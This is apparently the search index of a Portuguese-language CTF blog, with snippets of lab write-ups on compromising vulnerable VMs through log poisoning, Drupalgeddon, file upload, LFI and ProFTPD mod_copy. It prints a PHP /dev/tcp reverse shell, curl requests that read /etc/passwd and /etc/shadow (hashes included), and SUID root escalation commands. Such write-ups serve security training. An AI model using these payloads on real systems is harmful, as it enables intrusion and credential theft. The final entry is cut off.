[ { "title": "Desafio 2 - VM 10", "url": "/posts/desafio2-becodoxpl-vm10/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, Log Poisoning", "date": "2022-04-14 09:30:00 +0000", "snippet": "VM 10 - The EtherVM 10 - The EtherReconhecimentoNMAP‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -p- -v 192.168.56.13Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-12 09:57 EDTPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelVamos abrir no browser e ver a aplica√ß√£o web que est√° rodando.Ao navegar na pagina, vemos que tem um par√¢metro file recebendo um arquivo php, nesse caso o about.phpVamos interceptar essa requisi√ß√£o com o burp, para manipular a requisi√ß√£o e tentar acessar algum arquivo.Essa √© a requisi√ß√£o, e a resposta j√° no repeater do burp.Se inserirmos o ../../../etc/passwd no file, ele n√£o retorna nenhum arquivo, mas retorna HTTP 200, e notamos que a linha 9 retorna em branco, que √© onde deveria come√ßar o arquivo lido.Vimos que tem rodando um SSH, vamos tentar acessar os logs de autentica√ß√£o.Agora tentamos fazer login no SSH com um usu√°rio qualquer, para ver se reflete no log que conseguimos ver.Explora√ß√£o Log-PoisoningA tentativa de login no SSH foi inserida no auth.log.Como a p√°gina √© em PHP, vamos inserir um c√≥digo PHP, que vai receber um par√¢metro para a fun√ß√£o system, no login do SSH, para ver se ele vai executar o PHP.Vamos adicionar nosso par√¢metro cmd e enviar o comando ls para testar.Podemos ver que est√° executando comandos do sistema e retornando o resultado na p√°gina.Vamos criar um payload malicioso, para criar uma shell reversa usando o msfvenom.Vamos usar o burp para encodar em url, pois se der espa√ßo no par√¢metro recebido pelo cmd, ele quebra o c√≥digo e n√£o executaO request com o payload em URL vai ficar assimAntes de enviar, vamos deixar o netcat ouvindo na porta 443, que √© a mesma que usamos para criar o payload.E ao enviar o request com o payload, temos o reverse shell no netcat.Escalagem de Privil√©gioVamos importar a shell TTY para ter uma shell interativa e usar o sudo -l para ver quais comandos o usuario www-data pode executar como root.Podemos ver que ele pode executar um script em python que ao executar o arquivo, vemos que ele da a op√ß√£o para abrir um dos logs listados e ao escolher um dos dois, ele retorna o log.Vamos criar outro payload usando msfvenom, id√™ntico ao anterior, mas como j√° estamos usando a porta 443, vamos criar usando a porta 80, porque vamos usar um operador l√≥gico, para fazer abrir como root o payload malicioso.Vamos iniciar o http server do python para usarmos o wget no alvo e fazer o download do arquivo malicioso.Podemos ver que nosso arquivo foi enviado e j√° est√° no alvo.Vamos dar o m√°ximo de permiss√£o para conseguir executar ele.Ao executar o script como root, ele vai perguntar qual log queremos acessar e quando colocarmos o log, vamos usar o operador l√≥gico AND para que ele execute tamb√©m nosso arquivo malicioso como root, fazendo nosso reverse shell abrir no netcat com privil√©gio elevado." }, { "title": "Desafio 2 - VM 09", "url": "/posts/desafio2-becodoxpl-vm9/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, Drupal, Backdoor", "date": "2022-04-14 09:00:00 +0000", "snippet": "VM 9 - DCVM 9 - DCReconhecimentoNMAP‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -v 192.168.56.12Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-12 08:05 EDTPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)80/tcp open http Apache httpd 2.2.22 ((Debian))111/tcp open rpcbind 2-4 (RPC #100000)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelAcessando a porta 80 do servi√ßo web no browser, vemos a p√°gina inicial do Drupal.)Olhando o c√≥digo fonte, conseguimos ver vers√£o do drupal que est√° sendo usada.Ao procurar por Drupal no searchsploit, vemos que tem um exploit que explora um SQL Injection.Explora√ß√£o Drupalgeddon üí° Drupal 7.0 &lt; 7.31 - ‚ÄòDrupalgeddon‚Äô SQL Injection (PoC) (Reset Password) (1)O exploit insere um novo usu√°rio no banco de dados do Drupal, permitindo nosso acesso a aplica√ß√£o.Como o c√≥digo foi escrito na vers√£o 2.x do Python, teremos que executar com a mesma vers√£o, pois tem algumas diferen√ßas de sintaxe para o Python 3.xAgora vamos fazer login com o usu√°rio que criamos usando o exploit.Conseguimos fazer o login na aplica√ß√£o.Backdoor em PHP no TemaPodemos tentar inserir um backdoor no template principal de algum tema, para termos uma reverse shell.Vamos em appearance para ver os temas que est√£o instalados na plataforma.Vamos baixar um tema novo para inserir o backdoor na plataforma.Dentro da pasta do tema baixado, temos os arquivos que fazem parte dele.O template.php √© executado pela plataforma para carregar o novo tema, ent√£o vamos inserir um backdoor no c√≥digo dele, usando a fun√ß√£o exec() do php.O c√≥digo do template.php com o backdoor.Para carregar o tema, temos que compactar a pasta e assim conseguimos instalarPodemos ver que o tema com nosso backdoor foi instalado.Vamos deixar o netcat esperando a conex√£o e selecionar o tema.Assim conseguimos a shell.Agora podemos carregar a shell TTY usando o python.python -c 'import pty;pty.spawn(\"/bin/bash\")'Escalagem de Privil√©gioAo usar o comando sudo -l, retorna que o comando n√£o existe.Vamos usar o find para encontrar arquivos que possamos executar com permiss√£o de root.find / -perm -u=s -type f 2&gt;/dev/nullO usu√°rio tem permiss√£o para executar esses arquivos como root.Podemos ver que pode usar o /usr/bin/find, dentro desse comando existe uma func√£o exec, que permite executar comandos do sistema.Vamos chamar o /bin/sh com a fun√ß√£o -exec do find, assim ele vai executar o find como o root e consequentemente chamar o dash como root./usr/bin/find -exec \"/bin/sh\" \\;Assim conseguimos escalar o privil√©gio.Agora podemos acessar o diretorio /root e ler a flag que est√° la." }, { "title": "Desafio 2 - VM 08", "url": "/posts/desafio2-becodoxpl-vm8/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux", "date": "2022-04-14 08:00:00 +0000", "snippet": "VM 8 - SunsetVM 8 - SunsetReconhecimentoNMAP‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -v 192.168.56.11Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 19:34 EDTPORT STATE SERVICE VERSION21/tcp open ftp pyftpdlib 1.5.522/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelVamos ver se o FTP aceita o login com usu√°rio anonymous.Conseguimos fazer o login no FTP como anonymous e vemos que dentro do diret√≥rio tem um arquivo chamado backup.Vamos fazer download dele usando o comando get.Ao ver o conte√∫do do arquivo, vemos que h√° alguns usu√°rios junto com a hash da senha.Explora√ß√£oVamos usar o john para quebrar a hash e conseguir a senha.Conseguimos a senha do usu√°rio sunset.Vimos antes no scan do nmap, que tem um servi√ßo de SSH rodando na porta 22 no servidor, vamos acessar usando as credencias do usu√°rio sunset que conseguimos.Escalagem de Privil√©gioConseguimos acessar o servidor usando o SSH.Vamos usar o comando sudo -l para ver o que podemos fazer como root.O usu√°rio consegue usar o editor de texto ED com privil√©gios de root. üí°The GNU ed line editorVamos usar o editor de texto para adicionar um novo usu√°rio com privil√©gios elevados no /etc/passwdAgora podemos trocar o usu√°rio para o que criamos e ter privil√©gio elevado no servidor." }, { "title": "Desafio 2 - VM 07", "url": "/posts/desafio2-becodoxpl-vm7/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, WordPress", "date": "2022-04-14 08:00:00 +0000", "snippet": "VM 7 - Ha HardyVM 7 - Ha HardyReconhecimento:NMAP‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -v 192.168.56.10Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 16:00 EDTPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29 ((Ubuntu))No scan no nmap, s√≥ achamos a porta 80 aberta, que est√° rodando um Apache.Ao abrir no browser, vemos a p√°gina default do Apache.Vamos fazer uma enumera√ß√£o de diret√≥rios usando o FFUF.Podemos ver que existe um wordpress rodando.Olhando c√≥digo fonte, vemos os plugins que o WordPress est√° usando.Buscando por exploits, achamos um do reflex-galleryOlhando no diret√≥rio raiz do plugin, achamos o readme.txt.Dentro do readme.txt, vemos a vers√£o do plugin, que √© a 3.1.3.No searchsploit, existe um exploit para a vers√£o que vimos acima. üí°WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File UploadDentro do exploit, fala do path para a explora√ß√£o.http://192.168.56.10/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.phpQue ao ser acessado, retorna um erro dizendo que n√£o tem arquivos carregados, ent√£o vemos que existe o servi√ßo de upload e ser√° possivel explorar.Explora√ß√£o do File UploadComo n√£o achamos o lugar para fazer o upload, no exploit tem o c√≥digo de um formul√°rio que poderemos usar para o isso.&lt;form method=\"POST\" action=\"http://192.168.56.10/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php\" enctype=\"multipart/form-data\" &gt; &lt;input type=\"file\" name=\"qqfile\"&gt;&lt;br&gt; &lt;input type=\"submit\" name=\"Submit\" value=\"Pwn!\"&gt;&lt;/form&gt;Agora precisamos criar a reverse shell para enviar usando esse formul√°rio.Vamos usar uma shell simples que utiliza a fun√ß√£o exec() do php.&lt;?phpexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'\");?&gt;Vamos ent√£o abrir o formul√°rio que criamos e fazer o upload da reverse shell no servidor alvo.Ao abrir o path que armazena os arquivos carregados, que √© citado no exploit, vemos o nosso arquivo.Agora vamos configurar o netcat para receber a conex√£o reversa e depois abrimos o c√≥digo php que enviamos no browser, para termos acesso a reverse shell que enviamos.Escalagem de Privil√©gioAo tentar ver os comandos que o usu√°rio pode executar como root, usando o sudo -l, √© pedida a senha do usu√°rio, como n√£o temos a senha vamos ver quais arquivos ele tem permiss√£o para executar usando o find.Vemos acima que ele tem permiss√£o de usar o /bin/cp e pode copiar arquivos como root.Vamos usar para manipular o arquivo /etc/passwd e criar um novo usuario com privil√©gio elevado.Primeiro iremos ler o arquivo /etc/passwd e copiar todo o cont√©udo, depois vamos criar um arquivo na nossa m√°quina com o mesmo nome /etc/passwd e inserir o nosso usu√°rio seguindo o padr√£o utilizado pelo arquivo. üí°Understanding /etc/passwd file fieldsPara criar a senha, vamos usar o openssl e criar o hash no mesmo padr√£o do arquivo /etc/shadow que √© usado no linux. üí° OpenSSL - PASSWD‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ openssl passwd -1 -salt red-arrow frechaAgora vamos inserir o usuario no arquivo, com os mesmos dados do root.Ent√£o vamos fazer o upload do arquivo que criamos para o alvo.Podemos usar o mesmo formulario de upload.Podemos notar que ele est√° com o nome diferente, existe um ponto ( . ) no final do nome.Vamos copiar ele para criar um arquivo com o nome correto, sem o ponto.Agora vamos copiar o arquivo para a pasta /etc/ e substituir o original, pelo que tem o nosso usu√°rio.Ao tentar trocar de usu√°rio, ele da um erro, dizendo que o su precisa ser executado de um terminal.Vamos importar a shell interativa TTY, usando o python 3.Agora podemos mudar para o nosso usu√°rio com privil√©gio elevado.Podemos ver que temos acesso root.E dentro do diret√≥rio /root, temos a flag da VM." }, { "title": "Desafio 2 - VM 06", "url": "/posts/desafio2-becodoxpl-vm6/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, LFI", "date": "2022-04-14 08:00:00 +0000", "snippet": "VM 6 - WiresVM 6 - WiresReconhecimentoNMAP‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -v 192.168.56.9Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 10:42 EDTPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))3306/tcp open mysql MySQL (unauthorized)Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernelProcurando no searchsploit, vemos que n√£o tem exploit para o vsftpd.Vamos abrir a porta 80 no browser.Ela retorna a p√°gina default do Apache.Vamos enumerar os diret√≥rios usando o FFUF, que √© uma ferramenta para fuzzing. üí°Fuzz Faster U Fool - FFUFNa enumera√ß√£o, encontramos o diret√≥rio administrator que chama aten√ß√£o.E ao acessar via browser, vemos que a aplica√ß√£o est√° rodando o Cuppa CMS.No searchsploit temos um exploit para o Cuppa. üí°Cuppa CMS - ‚Äò/alertConfigField.php‚Äô Local/Remote File InclusionO exploit explora um Local File Inclusion / Remote File Inclusion, que nos permite ler arquivos atrav√©s do servi√ßo web. üí°What is Local File Inclusion (LFI)?Ao ler o c√≥digo do exploit, vemos que existe um path para rodar o exploit.Ao abrir essa URL na aplica√ß√£o, vemos que a p√°gina existe, ent√£o vamos continuar com a explora√ß√£o.Explora√ß√£o LFINo exploit tamb√©m cita que podemos ler o /etc/passwd usando essa falha, mas ao tenta, ele n√£o retorna nada e mesmo fazendo o encode para base64 pelo browser, continua n√£o retornando nada.Ent√£o vamos usar o curl, para fazer o encode e a requisi√ß√£o.Ap√≥s executar o comando usando o curl, temos acesso ao /etc/passwd do servidor.‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ curl -s --data-urlencode urlConfig=../../../../../../../../../../../etc/passwd http://192.168.56.9/administrator/alerts/alertConfigField.php?root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falsemessagebus:x:106:110::/var/run/dbus:/bin/falseuuidd:x:107:111::/run/uuidd:/bin/falselightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/falsewhoopsie:x:109:117::/nonexistent:/bin/falseavahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falseavahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falsednsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/falsecolord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/falsespeech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falsehplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/falsekernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/falsepulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/falsertkit:x:118:126:RealtimeKit,,,:/proc:/bin/falsesaned:x:119:127::/var/lib/saned:/bin/falseusbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/falsew1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bashsshd:x:121:65534::/var/run/sshd:/usr/sbin/nologinftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/falsemysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/falseVamos tentar com o /etc/shadow para conseguir os hashs das senhas dos usu√°rios.‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ curl -s --data-urlencode urlConfig=../../../../../../../../../../../etc/shadow http://192.168.56.9/administrator/alerts/alertConfigField.php?root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::daemon:*:17379:0:99999:7:::bin:*:17379:0:99999:7:::sys:*:17379:0:99999:7:::sync:*:17379:0:99999:7:::games:*:17379:0:99999:7:::man:*:17379:0:99999:7:::lp:*:17379:0:99999:7:::mail:*:17379:0:99999:7:::news:*:17379:0:99999:7:::uucp:*:17379:0:99999:7:::proxy:*:17379:0:99999:7:::www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::backup:*:17379:0:99999:7:::list:*:17379:0:99999:7:::irc:*:17379:0:99999:7:::gnats:*:17379:0:99999:7:::nobody:*:17379:0:99999:7:::systemd-timesync:*:17379:0:99999:7:::systemd-network:*:17379:0:99999:7:::systemd-resolve:*:17379:0:99999:7:::systemd-bus-proxy:*:17379:0:99999:7:::syslog:*:17379:0:99999:7:::_apt:*:17379:0:99999:7:::messagebus:*:17379:0:99999:7:::uuidd:*:17379:0:99999:7:::lightdm:*:17379:0:99999:7:::whoopsie:*:17379:0:99999:7:::avahi-autoipd:*:17379:0:99999:7:::avahi:*:17379:0:99999:7:::dnsmasq:*:17379:0:99999:7:::colord:*:17379:0:99999:7:::speech-dispatcher:!:17379:0:99999:7:::hplip:*:17379:0:99999:7:::kernoops:*:17379:0:99999:7:::pulse:*:17379:0:99999:7:::rtkit:*:17379:0:99999:7:::saned:*:17379:0:99999:7:::usbmux:*:17379:0:99999:7:::w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::sshd:*:17554:0:99999:7:::ftp:*:17554:0:99999:7:::mysql:!:17554:0:99999:7:::Agora que temos a hash, vamos usar o john para descobrir a senha.Conseguimos a senha do user w1r3sVamos conectar ao servidor usando o SSH da porta 22.Escalagem de Privil√©gioAo rodar o sudo -l, vemos que o usu√°rio j√° tem privil√©gios de root.E dentro do diret√≥rio root, temos a flag" }, { "title": "Desafio 2 - VM 05", "url": "/posts/desafio2-becodoxpl-vm5/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, Brute Force, Backdoor", "date": "2022-04-13 20:00:00 +0000", "snippet": "VM 5 - ViolatorVM 5 - ViolatorReconhecimentoNMAP:‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn 192.168.56.8 -vStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 08:42 EDTPORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.5rc380/tcp open http Apache httpd 2.4.7 ((Ubuntu))Service Info: OS: UnixTemos um servi√ßo FTP rodando na porta 21, vamos usar o script do metasploit para verificar se conseguimos fazer login com o usu√°rio anonymous.Como podemos ver, n√£o aceita anonymous login.A vers√£o do ProFTPD rodando √© a 1.3.5, nela existe uma falha no m√≥dulo mod_copy, que permite qualquer usu√°rio copiar arquivos sem precisar de permiss√£o. üí° ProFTPD Vulnerability Lets Users Copy Files Without PermissionVamos usar o netcat para conectar ao FTP e copiar o arquivo /etc/passwd para ver quais usu√°rios existem.Agora podemos acessar o arquivo via browser, atrav√©s do servi√ßo web que est√° rodando na m√°quina.J√° temos os usu√°rios existentes no servidor.Ao abrir a p√°gina inicial do servi√ßo web, vemos que no rodap√© existe uma url.A url leva para a p√°gina da WikiPedia do Album Violator do grupo Depeche Mode.Vemos que os usu√°rios que achamos no passwd, s√£o os nomes dos integrantes do grupo.Vemos tamb√©m as m√∫sicas desse √°lbum.Vamos usar essas informa√ß√µes para criar uma wordlist personalizada e tentar fazer um bruteforce no servi√ßo FTP, para conseguir a senha dos usu√°rios que encontramos.Para isso vamos usar o hydra.Explora√ß√£o mod_copyConseguimos as credenciais dos usu√°rios do servidor.Agora vamos usar o metasploit para explorar a falha do mod_copy de forma automatizada e conseguir uma shell reversa.Configura√ß√µes do exploit.Ao executar o exploit, conseguimos a shell reversa.Vamos criar nossa shell interativa com o python pty e mudar para algum usu√°rio que listamos no bruteforce.Escalagem de Privil√©gioO usu√°rio n√£o tem acesso root, vamos usar o comando sudo -l para ver os comandos que ele pode executar como root.O usu√°rio pode iniciar um ProFTPD, vamos at√© o diret√≥rio desse servi√ßo e ver a vers√£o.O ProFTPD 1.3.3c, √© uma vers√£o n√£o oficial que cont√©m um backdoor no seu c√≥digo. üí° ProFTPD-1.3.3c-backdoorAgora vamos ver arquivo de configura√ß√£o do servi√ßo.Dentro do arquivo de configura√ß√£o, fala que o servi√ßo ser√° executado em localhost na porta 2121Vamos ver se existe algum servi√ßo rodando no localhost com o netstat usando as flags: -a (all) - Mostra todas as conex√µes -n (numeric) - Mostra o IP, sem resolver o nome do DNS -t (tcp) - Mostra apenas os protocolos TCP. -p (program) - Mostra o ID do processo/programa que est√° usando a conex√£o.N√£o existe nenhum servi√ßo rodando no localhost do servidor.Ap√≥s rodar o script que o usu√°rio tem permiss√£o e ao verificar o netstat novamente, podemos ver que o servi√ßo foi criado.Ao tentar acessar a porta 2121 com o netcat, retorna um Connection Refused, pois ele tem acesso apenas pelo localhost do servidor alvo.Podemos fazer o pivot e ter acesso ao localhost.Dentro do meterpreter, existe uma op√ß√£o de port forwarding, para redirecionamento de portas.Vamos jogar essa sess√£o para background e abrir uma sess√£o com meterpreter.Para isso vamos usar o m√≥dulo shell_to_meterpreter do metasploit e fazer o upgrade da sess√£o que j√° temos para o meterpreter.Dentro do help do meterpreter, podemos ver o portfwd, que vamos usar para fazer o port forwarding. üí° Meterpreter - Port ForwardingVamos adicionar o portforwarding, para que o que for executado no nosso localhost na porta 2121, seja executado no servidor alvo tamb√©m.Agora podemos usar o backdoor que existe na vers√£o 1.3.3c do ProFTPD.Ap√≥s executar o exploit, recebemos a conex√£o reversa do backdoor existente e temos acesso root no alvo." }, { "title": "Desafio 2 - VM 04", "url": "/posts/desafio2-becodoxpl-vm4/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, FTP, Mod_Copy", "date": "2022-04-08 20:00:00 +0000", "snippet": "VM 4 - JOYVM 4 - JOYReconhecimento:NMAP:‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -p- -Pn -v 192.168.56.7Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 14:39 EDTPORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.2.1022/tcp open ssh Dropbear sshd 0.34 (protocol 2.0)25/tcp open smtp Postfix smtpd80/tcp open http Apache httpd 2.4.25110/tcp open pop3 Dovecot pop3d139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)465/tcp open smtp Postfix smtpd587/tcp open smtp Postfix smtpd993/tcp open ssl/imap Dovecot imapd995/tcp open ssl/pop3 Dovecot pop3dService Info: Hosts: The, JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernelVamos ver se o FTP aceita login como anonymous:Para isso vamos usar o m√≥dulo auxiliary/scanner/ftp/anonymous do metasploit, para automatizarAp√≥s inserir as op√ß√µes que s√£o necess√°rias, vamos rodar o scan.Podemos ver que o alvo aceita conex√£o com o usu√°rio anonymous no servi√ßo de FTP.E assim conseguimos o acesso ao FTP.Dentro da pasta raiz do ftp, temos os diret√≥rios:O diret√≥rio download est√° vazio.Dentro do upload temos:Logo no primeiro arquivo chamado ‚Äúdirectory‚Äù, temos como se fosse o log do comando ls -lha dentro da pasta home do usu√°rio Patrick:E um arquivo chamado version_control que chamou aten√ß√£oExplora√ß√£o mod_copyVamos acessar o FTP atrav√©s do netcat e usar o mod_copy para copiar o arquivo version_control do diret√≥rio do usu√°rio Patrick para o diret√≥rio do FTP.Vamos acessar novamente o FTP e fazer o download do arquivo que copiamosAo acessar o arquivo, podemos ver uma informa√ß√£o interessante, dizendo que o diret√≥rio da aplica√ß√£o web foi alterado e tamb√©m a vers√£o real do ProFTPd, que no scan do nmap estava diferente.Dentro do metasploit, existe um exploit para essa vers√£o do ProFTPd que explora o mod_copy e nos garante um RCE.Vamos configurar o exploit, lembrando que o diret√≥rio da aplica√ß√£o web foi alterado e vamos utilizar o payload reverse_python, para conseguir a conex√£o reversa.Ap√≥s executar o exploit, temos a conex√£o reversa como usu√°rio www-data:Dentro do diret√≥rio que temos acesso, existe uma pasta chamada ossec e dentro dela temos alguns arquivos e um chamou aten√ß√£o.De dentro dele temos as credencias do usu√°rio Patrick:Estamos com a reverse_shell que conseguimos atrav√©s do metasploit, mas ela √© instavel.Vamos alterar para o bash atrav√©s do modulo pty do python 3 usando o comandopython3 -c ‚Äòimport pty;pty.spawn(‚Äù/bin/bash‚Äù)‚ÄôAgora vamos alterar o usu√°rio para o patrick, que n√£o tem privil√©gios de root.Escalagem de Privil√©gioVamos ver quais comandos ele pode executar como root.O usu√°rio pode executar o arquivo test, dentro da pasta script que est√° no diret√≥rio raiz dele, mas ao tentar acessar o arquivo, vemos que n√£o temos acesso para isso.Podemos explorar o mod_copy para substituir o arquivo test.Vamos criar um arquivo utilizando a linguagem AWK para chamar o /bin/bash usando o m√≥dulo de sistema e nomear como test, que √© o arquivo que o usu√°rio patrick consegue executar como rootE vamos usar o FTP para fazer o upload desse arquivoAgora vamos logar no FTP atrav√©s do netcat e usar o mod_copy para copiar o arquivo test para a pasta script.Agora vamos executar o arquivo atrav√©s da shell do metasploit para escalar privil√©gio.)" }, { "title": "Desafio 2 - VM 03", "url": "/posts/desafio2-becodoxpl-vm3/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, Drupal, Overlayfs", "date": "2022-04-08 19:00:00 +0000", "snippet": "VM 3 - DROOPY: V0.2VM 3 - **DROOPY: V0.2**Reconhecimento:NMAP :‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -p- -Pn 192.168.56.6 -vStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 12:35 EDTPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.7 ((Ubuntu))Acessando a porta 80 no browser, temos uma p√°gina web que podemos ver que est√° usando o Drupal.Acessando o c√≥digo fonte dessa p√°gina, vemos que est√° usando a vers√£o 7 do Drupal.Ap√≥s uma pesquisa no searchsploit, podemos que nessa vers√£o do Drupal, existe uma vulnerabilidade conhecida como Drupalgeddon, que resulta em um RCE atrav√©s de um SQL Injection.Vamos procurar o exploit dentro do metasploi para automatizar a explora√ß√£o:Explora√ß√£o via MetasploitAgora vamos configurar o exploit, inserindo as informa√ß√µes necess√°rias.Ap√≥s rodar o exploit, temos uma sess√£o do meterpreter, mas n√£o temos privil√©gios de root.Vendo as informa√ß√µes do sistema, vemos que a vers√£o do Kernel Linux √© a 3.13.0, que √© uma vers√£o vulner√°vel a uma falha no overlayfs que permite a escalagem de privil√©gios localmente.Escalagem de Privil√©giosPara isso, vamos jogar a sess√£o do meterpreter para o background e procurar pelo overlayfs no searchsploit.Vamos copiar o arquivo do exploit e compilar usando o gcc.)Ap√≥s compilado, precisamos enviar para o alvo, pois precisar ser executado localmente por ele.Podemos fazer o upload via meterpreter no diretorio /tmp, pois temos acesso para isso.Ou podemos subir um http server com python3 para hospedar o arquivo.E usar o wget no alvo para fazer o download do exploit.Agora vamos dar permiss√£o de execu√ß√£o para o arquivo que enviamos.Ap√≥s a execu√ß√£o do exploit, conseguimos escalar o privil√©gio e nos tornar root." }, { "title": "Desafio 2 - VM 02", "url": "/posts/desafio2-becodoxpl-vm2/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Struts", "date": "2022-04-08 18:00:00 +0000", "snippet": "VM 2 - Struts S2-052VM 2 - Struts S2-052ReconhecimentoSCAN NMAP‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -p- 192.168.56.5 -vStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 08:35 EDTPORT STATE SERVICE VERSION80/tcp open http Apache Tomcat/Coyote JSP engine 1.1Acessando a porta 80 pelo browser, temos uma aplica√ß√£o web.Explora√ß√£oComo o LAB j√° est√° dizendo que √© uma vulnerabilidade no Struts 2, economizamos tempo no reconhecimento e podemos ir direto para a 